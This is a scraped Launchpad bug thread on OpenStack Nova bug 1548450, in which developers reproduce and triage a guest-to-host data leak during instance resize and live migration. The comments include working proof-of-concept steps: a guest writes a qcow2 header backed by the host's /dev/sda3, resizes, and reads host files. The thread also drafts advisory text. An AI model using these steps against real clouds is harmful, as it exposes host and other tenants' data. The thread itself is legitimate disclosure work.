qemu     18725 93.7  9.4 1421432 751232 ?      Rl   14:00   6:47 /usr/libexec/<wbr />qemu-kvm -name instance-00000005 -S -machine pc-i440fx-<wbr />rhel7.2.<wbr />0,accel=<wbr />tcg,usb=<wbr />off -m 512 -realtime mlock=off -smp 1,sockets=<wbr />1,cores=<wbr />1,threads=<wbr />1 -uuid d56b9bf3-<wbr />f3b0-4d76-<wbr />952b-5015b43bab<wbr />cd -smbios type=1,<wbr />manufacturer=<wbr />Red Hat,product=<wbr />OpenStack Compute,<wbr />version=<wbr />12.0.1-<wbr />6.el7ost,<wbr />serial=<wbr />c512dcd1-<wbr />48bb-644c-<wbr />9794-82f056d85a<wbr />95,uuid=<wbr />d56b9bf3-<wbr />f3b0-4d76-<wbr />952b-5015b43bab<wbr />cd,family=<wbr />Virtual Machine -no-user-config -nodefaults -chardev socket,<wbr />id=charmonitor,<wbr />path=/var/<wbr />lib/libvirt/<wbr />qemu/domain-<wbr />instance-<wbr />00000005/<wbr />monitor.<wbr />sock,server,<wbr />nowait -mon chardev=<wbr />charmonitor,<wbr />id=monitor,<wbr />mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-<wbr />uhci,id=<wbr />usb,bus=<wbr />pci.0,addr=<wbr />0x1.0x2 -drive file=/var/<wbr />lib/nova/<wbr />instances/<wbr />d56b9bf3-<wbr />f3b0-4d76-<wbr />952b-5015b43bab<wbr />cd/disk,<wbr />if=none,<wbr />id=drive-<wbr />virtio-<wbr />disk0,format=<wbr />raw,cache=<wbr />none -device virtio-<wbr />blk-pci,<wbr />scsi=off,<wbr />bus=pci.<wbr />0,addr=<wbr />0x4,drive=<wbr />drive-virtio-<wbr />disk0,id=<wbr />virtio-<wbr />disk0,bootindex<wbr />=1 -drive file=/var/<wbr />lib/nova/<wbr />instances/<wbr />d56b9bf3-<wbr />f3b0-4d76-<wbr />952b-5015b43bab<wbr />cd/disk.<wbr />eph0,if=<wbr />none,id=<wbr />drive-virtio-<wbr />disk1,format=<wbr />raw,cache=<wbr />none -device virtio-<wbr />blk-pci,<wbr />scsi=off,<wbr />bus=pci.<wbr />0,addr=<wbr />0x5,drive=<wbr />drive-virtio-<wbr />disk1,id=<wbr />virtio-<wbr />disk1 -netdev tap,fd=<wbr />26,id=hostnet0 -device virtio-<wbr />net-pci,<wbr />netdev=<wbr />hostnet0,<wbr />id=net0,<wbr />mac=fa:<wbr />16:3e:32:<wbr />1c:23,bus=<wbr />pci.0,addr=<wbr />0x3 -chardev file,id=<wbr />charserial0,<wbr />path=/var/<wbr />lib/nova/<wbr />instances/<wbr />d56b9bf3-<wbr />f3b0-4d76-<wbr />952b-5015b43bab<wbr />cd/console.<wbr />log -device isa-serial,<wbr />chardev=<wbr />charserial0,<wbr />id=serial0 -chardev pty,id=charserial1 -device isa-serial,<wbr />chardev=<wbr />charserial1,<wbr />id=serial1 -device usb-tablet,<wbr />id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-<wbr />vga,id=<wbr />video0,<wbr />bus=pci.<wbr />0,addr=<wbr />0x2 -device virtio-<wbr />balloon-<wbr />pci,id=<wbr />balloon0,<wbr />bus=pci.<wbr />0,addr=<wbr />0x6 -msg timestamp=on</p>
<p>- Confirm the block layout within the guest and umount the formatted ephemeral disk :</p>
<p>root@guest # lsblk<br />
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT<br />
vda    252:0    0   5G  0 disk<br />
└─vda1 252:1    0   5G  0 part /<br />
vdb    252:16   0   1G  0 disk /mnt<br />
root@guest # umount /mnt</p>
<p>- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :</p>
<p>root@guest # qemu-img create -f qcow2 -o backing_<wbr />file=/dev/<wbr />sda3,backi.<wbr />..</p></div>
    
    <p>
      <a href="/nova/+bug/1548450/comments/7">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've been able to reproduce this using a compute host block device as the backing file on RHEL OSP 8 (Liberty). I plan on repeating this with devstack for Mitaka shortly. My notes on this reproducer are below :

- Image and flavor configuration :

# wget https://download.fedoraproject.org/pub/fedora/linux/releases/23/Cloud/x86_64/Images/Fedora-Cloud-Base-23-20151030.x86_64.qcow2
# glance image-create --name fedora --file Fedora-Cloud-Base-23-20151030.x86_64.qcow2 --disk-format qcow2 --container-format bare --progress
# nova flavor-create eph 6 512 5 1 --ephemeral 1
# nova flavor-create eph_large 7 768 5 1 --ephemeral 1

- Ensure use_cow_images is False on all compute hosts :

# openstack-config --get /etc/nova/nova.conf libvirt use_cow_images
False

- Boot an instance using the fedora image and a small ephemeral disk :

# nova boot --key-name local --image fedora --ephemeral size=1,format=ext4 --flavor 6 --nic net-id=b41000f6-9de2-4851-a622-2a5786167e83 test-boot

root@host # ps aux | grep qemu
qemu     18725 93.7  9.4 1421432 751232 ?      Rl   14:00   6:47 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 512 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=c512dcd1-48bb-644c-9794-82f056d85a95,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on

- Confirm the block layout within the guest and umount the formatted ephemeral disk :

root@guest # lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda    252:0    0   5G  0 disk 
└─vda1 252:1    0   5G  0 part /
vdb    252:16   0   1G  0 disk /mnt
root@guest # umount /mnt

- Use qemu-img to write a qcow2 header to the device using a physical device on the host as a backing file :

root@guest # qemu-img create -f qcow2 -o backing_file=/dev/sda3,backing_fmt=raw /dev/vdb 20G
Formatting '/dev/vdb', fmt=qcow2 size=21474836480 backing_file='/dev/sda3' backing_fmt='raw' encryption=off cluster_size=65536 lazy_refcounts=off refcount_bits=16

root@guest # qemu-img info /dev/vdb
image: /dev/vdb
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 0
cluster_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
    compat: 1.1
    lazy refcounts: false
    refcount bits: 16
    corrupt: false

- Now request a resize of the instance :

# nova resize d56b9bf3-f3b0-4d76-952b-5015b43babcd 7

- Once complete confirm the qemu-kvm command line used to launch the instance, note the qcow2 format for the ephemeral disk :

root@host # ps aux | grep qemu
qemu     20762 99.8  5.5 1859748 436596 ?      Rl   14:11   0:22 /usr/libexec/qemu-kvm -name instance-00000005 -S -machine pc-i440fx-rhel7.2.0,accel=tcg,usb=off -m 768 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid d56b9bf3-f3b0-4d76-952b-5015b43babcd -smbios type=1,manufacturer=Red Hat,product=OpenStack Compute,version=12.0.1-6.el7ost,serial=599d7700-3d4b-1543-8882-f4ec4901c043,uuid=d56b9bf3-f3b0-4d76-952b-5015b43babcd,family=Virtual Machine -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-instance-00000005/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc -no-shutdown -boot strict=on -device piix3-usb-uhci,id=usb,bus=pci.0,addr=0x1.0x2 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk,if=none,id=drive-virtio-disk0,format=raw,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x4,drive=drive-virtio-disk0,id=virtio-disk0,bootindex=1 -drive file=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0,if=none,id=drive-virtio-disk1,format=qcow2,cache=none -device virtio-blk-pci,scsi=off,bus=pci.0,addr=0x5,drive=drive-virtio-disk1,id=virtio-disk1 -netdev tap,fd=26,id=hostnet0 -device virtio-net-pci,netdev=hostnet0,id=net0,mac=fa:16:3e:32:1c:23,bus=pci.0,addr=0x3 -chardev file,id=charserial0,path=/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/console.log -device isa-serial,chardev=charserial0,id=serial0 -chardev pty,id=charserial1 -device isa-serial,chardev=charserial1,id=serial1 -device usb-tablet,id=input0 -vnc 0.0.0.0:0 -k en-us -device cirrus-vga,id=video0,bus=pci.0,addr=0x2 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x6 -msg timestamp=on

- Again within the guest confirm the block layout, note that there is now a 20G device mounted under /mnt :

root@guest # lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
vda    252:0    0   5G  0 disk 
└─vda1 252:1    0   5G  0 part /
vdb    252:16   0  20G  0 disk /mnt

- As we have full access to the block device we can gain access not only to files on the host but potentially other instances as well :

root@guest # cat /mnt/etc/redhat-release 
Red Hat Enterprise Linux Server release 7.2 (Maipo)

root@guest # qemu-img info /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0 
image: /mnt/var/lib/nova/instances/d56b9bf3-f3b0-4d76-952b-5015b43babcd/disk.eph0
file format: qcow2
virtual size: 20G (21474836480 bytes)
disk size: 1.0G
cluster_size: 65536
backing file: /dev/sda3
backing file format: raw
Format specific information:
    compat: 1.1
    lazy refcounts: false
    refcount bits: 16
    corrupt: false

root@host # lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   20G  0 disk 
├─sda1   8:1    0  512M  0 part /boot
├─sda2   8:2    0    1G  0 part [SWAP]
└─sda3   8:3    0 18.5G  0 part /
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T19:58:09.707307+00:00" title="2016-02-23 19:58:09 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I&#x27;ve confirmed the OSSA task and raises its priority accordingly...</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ouch, so backing file can be a block device. Thank for the detailed analysis Lee, I've confirmed the OSSA task and raises its priority accordingly...</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in nova: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Confirmed
      </td>
    </tr>
  
  
    
      <tr>
        <td colspan="2">Changed in ossa: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Incomplete &#8594; Confirmed
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; Critical
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T20:19:07.300483+00:00" title="2016-02-23 20:19:07 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Impact description draft #1 (assuming write access):</p>
<p>Title: Nova host data access through resize/migration<br />
Reporter: Matthew Booth (Red Hat)<br />
Products: Nova<br />
Affects: &lt;=2015.1.2, &gt;=12.0.0 &lt;=12.0.1</p>
<p>Description:<br />
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting &quot;use_cow_images = False&quot; (not default) are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Impact description draft #1 (assuming write access):

Title: Nova host data access through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: &lt;=2015.1.2, &gt;=12.0.0 &lt;=12.0.1

Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read or write arbitrary files from the compute host. Only setups using libvirt driver and setting "use_cow_images = False" (not default) are affected.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T20:23:52.357059+00:00" title="2016-02-23 20:23:52 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Access is read only, writes are only applied to the ephemeral qcow2 file. apologies for not making that clear in my note. </textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray (tristan-cacqueray)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-23T20:50:40.249191+00:00" title="2016-02-23 20:50:40 UTC">on 2016-02-23</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.</p>
<p>Impact description draft #2:</p>
<p>Title: Nova host data leak through resize/migration<br />
Reporter: Matthew Booth (Red Hat)<br />
Products: Nova<br />
Affects: &lt;=2015.1.2, &gt;=12.0.0 &lt;=12.0.1</p>
<p>Description:<br />
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting &quot;use_cow_images = False&quot; (not default) are affected.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">No worries, I also assumed the worst case in that early draft. This second version also narrow affected deployment to the one using raw storage.

Impact description draft #2:

Title: Nova host data leak through resize/migration
Reporter: Matthew Booth (Red Hat)
Products: Nova
Affects: &lt;=2015.1.2, &gt;=12.0.0 &lt;=12.0.1

Description:
Matthew Booth from Red Hat reported a vulnerability in Nova instance resize/migration. By overwriting an ephemeral or root disk with a malicious image before requesting a resize, an authenticated user may be able to read arbitrary files from the compute host. Only setups using libvirt driver with raw storage and setting "use_cow_images = False" (not default) are affected.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-24T12:07:55.384294+00:00" title="2016-02-24 12:07:55 UTC">on 2016-02-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don&#x27;t copy over disk.info, it&#x27;s possible that a live migration followed by a reboot could result in the same vulnerability. Lee&#x27;s looking into this.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Just to capture it here, I wonder if the same vulnerability could exist for live migration. If we don't copy over disk.info, it's possible that a live migration followed by a reboot could result in the same vulnerability. Lee's looking into this.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mbooth-9" class="sprite person">Matthew Booth (mbooth-9)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-24T12:38:03.058346+00:00" title="2016-02-24 12:38:03 UTC">on 2016-02-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>At first glance, I think live migration is vulnerable. pre_live_migration runs on the destination host, and runs _create_<wbr />images_<wbr />and_backing(<wbr />) without having copied over disk.info. _create_<wbr />images_<wbr />and_backing is passed disk_info (not to be confused with disk.info) which was originally generated by libvirt.<wbr />get_instance_<wbr />disk_info on the source host. This disk_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.</p>
<p>If the user reboots, _hard_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt.<wbr />_get_guest_<wbr />disk_config for the ephemeral disk. This calls imagebackend.<wbr />image()<wbr />, which instantiates a Raw object. That instantiation calls correct_format(), which calls resolve_<wbr />driver_<wbr />format(<wbr />), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.</p>
<p>Long story short: pre_live_migration should probably also copy disk.info.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">At first glance, I think live migration is vulnerable. pre_live_migration runs on the destination host, and runs _create_images_and_backing() without having copied over disk.info. _create_images_and_backing is passed disk_info (not to be confused with disk.info) which was originally generated by libvirt.get_instance_disk_info on the source host. This disk_info is going to correctly identify the ephemeral disk as not having a backing file. It will create a blank disk of the correct format (raw) and size at the destination. The live migration process will then copy over the malicious bits to the blank disk, and the guest will run on the destination host using xml taken from the source host, which again will contain the correct backing information. However, as far as I can see, disk.info still does not exist on the destination at this point.

If the user reboots, _hard_reboot will regenerate the guest xml. Through a long chain of calls, this will result in a call to libvirt._get_guest_disk_config for the ephemeral disk. This calls imagebackend.image(), which instantiates a Raw object. That instantiation calls correct_format(), which calls resolve_driver_format(), which sees that there is no disk.info, inspects the disk and incorrectly reports it as qcow2 with the malicious backing file. At this point, the user can access the backing file.

Long story short: pre_live_migration should probably also copy disk.info.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/1548450/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~lyarwood" class="sprite person">Lee Yarwood (lyarwood)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-02-24T14:30:38.432744+00:00" title="2016-02-24 14:30:38 UTC">on 2016-02-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/1548450/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve reproduced this case where a qcow2 header is written to the raw ephemeral on the source host before it and any associated storage is then live migrated. In this case disk.info is regenerated on the destination. After a hard reboot the instance then uses the ephemeral disk as if it were a qcow2 file. Again, my notes on this are below :</p>
<p>root@source # cat /var/lib/<wbr />nova/instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />info<br />
{&quot;/var/<wbr />lib/nova/<wbr />instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk&quot;<wbr />: &quot;raw&quot;, &quot;/var/lib/<wbr />nova/instances/<wbr />d7166c75-<wbr />7561-4788-<wbr />9bc0-481eee7808<wbr />2f/disk.<wbr />eph0&quot;: &quot;raw&quot;}</p>
<p>root@guest # lsblk<br />
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT<br />
vda    252:0    0   5G  0 disk<br />
└─vda1 252:1    0   5G  0 part /<br />
vdb    252:16   0   1G  0 disk /mnt</p>
<p>root@guest # umount /mnt</p>
<p>root@guest # qemu-img create -f qcow2 -o backing_<wbr />file=/dev/<wbr />sda3,backing_<wbr />fmt=raw /dev/vdb 20G<br />
Formatting &#x27;/dev/vdb&#x27;, fmt=qcow2 size=21474836480 backing_<wbr />file=&#x27;/<wbr />dev/sda3&#x27; backing_fmt=&#x27;raw&#x27; encryption=off cluster_size=65536 lazy_refcounts=off refcount_bits=16<br />
[root@test-<wbr />live-migrate ~]# lsblk<br />
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT<br />
